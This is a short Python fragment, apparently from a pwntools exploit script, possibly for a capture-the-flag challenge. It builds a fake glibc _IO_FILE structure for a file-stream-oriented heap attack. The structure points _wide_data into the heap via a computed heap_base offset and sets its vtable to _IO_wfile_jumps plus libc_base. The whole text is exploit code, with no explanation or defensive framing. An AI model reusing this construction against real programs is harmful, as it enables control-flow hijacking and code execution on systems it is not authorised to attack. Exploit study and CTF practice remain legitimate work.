fake_IO_FILE = flat({
    0x0: 0,  # _IO_read_end
    0x8: 0,  # _IO_read_base
    0x10: 0,  # _IO_write_base
    0x18: 0,  # _IO_write_ptr
    0x20: 0,  # _IO_write_end
    0x28: 0,  # _IO_buf_base
    0x30: 0,  # _IO_buf_end
    0x38: 0,  # _IO_save_base
    0x40: 0,  # _IO_backup_base
    0x48: 0,  # _IO_save_end
    0x50: 0,  # _markers
    0x58: 0,  # _chain
    0x60: 0,  # _fileno
    0x68: 0,  # _old_offset
    0x70: 0,  # _cur_column
    0x78: 0,  # _lock
    0x80: 0,  # _offset
    0x88: 0,  # _codecvt
    0x90: 0x5635cdee0310 - 0x5635cdede000 + heap_base,  # _wide_data
    0x98: 0,  # _freeres_list
    0xa0: 0,  # _freeres_buf
    0xa8: 0,  # __pad5
    0xb0: 0,  # _mode
    0xc8: _IO_wfile_jumps + libc_base,  # vtable
})